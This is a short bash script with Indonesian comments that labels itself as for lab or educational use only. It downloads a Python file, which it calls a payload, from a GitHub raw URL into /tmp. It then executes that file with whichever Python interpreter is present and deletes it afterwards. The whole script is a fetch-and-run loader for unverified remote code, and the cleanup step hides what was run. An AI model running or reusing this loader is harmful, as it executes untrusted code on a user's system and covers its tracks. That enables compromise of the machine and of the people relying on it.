#!/bin/bash
# Skrip ini hanya untuk lingkungan lab/edukasi!
# JANGAN gunakan di sistem produksi atau tanpa izin.

URL="https://raw.githubusercontent.com/ftn-cyber/WebBUGanalyst/refs/heads/main/Data/Test.py"
TMP_FILE="/tmp/test_$(date +%s).py"

echo "[+] Mengunduh payload dari: $URL"
if wget -q -O "$TMP_FILE" "$URL"; then
    echo "[+] Unduhan berhasil. Menjalankan..."
    if command -v python3 &> /dev/null; then
        python3 "$TMP_FILE"
    elif command -v python &> /dev/null; then
        python "$TMP_FILE"
    else
        echo "[-] Error: Python tidak ditemukan!"
        rm -f "$TMP_FILE"
        exit 1
    fi
    echo "[+] Eksekusi selesai. Membersihkan..."
    rm -f "$TMP_FILE"
else
    echo "[-] Gagal mengunduh file!"
    exit 1
fi
